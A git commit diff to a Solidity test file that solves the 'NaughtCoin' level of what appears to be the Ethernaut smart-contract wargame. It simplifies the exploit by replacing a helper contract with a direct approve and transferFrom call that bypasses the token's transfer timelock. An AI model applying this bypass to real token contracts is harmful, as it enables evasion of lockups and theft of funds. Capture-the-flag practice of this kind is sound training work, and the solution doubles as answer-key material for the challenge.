324efa4609d1d1b11b2e426ce9d0fbec5ebcd412
capu <hi@capu.tech>
2023-09-11 13:05:04 -0300

    realized the extra contract wasnt necessary for 15-NaughtCoin

--- test/15-NaughtCoin.t.sol
+++ test/15-NaughtCoin.t.sol
@@ -2,24 +2,16 @@
 pragma solidity ^0.8.13;
 
 import {BaseTest} from "./BaseTest.sol";
-import {ERC20} from "openzeppelin-contracts/token/ERC20/ERC20.sol";
 import {NaughtCoinFactory} from "../src/levels/15-NaughtCoinFactory.sol";
 import {NaughtCoin} from "../src/levels/15-NaughtCoin.sol";
-
-contract Withdrawer {
-    function withdraw(ERC20 token, uint256 amount) external {
-        token.transferFrom(msg.sender, address(this), amount);
-    }
-}
 
 contract NaughtCoinSolution is BaseTest {
 
     function solution(address payable target_) internal override{
         uint256 amount = 1000000 * (10 ** 18);
         NaughtCoin target = NaughtCoin(target_);
-        Withdrawer withdrawer = new Withdrawer();
-        target.approve(address(withdrawer), amount);
-        withdrawer.withdraw(target, amount);
+        target.approve(attacker, amount);
+        target.transferFrom(attacker, address(this), amount);
     }
 
     function construction() internal override returns(address payable ) {
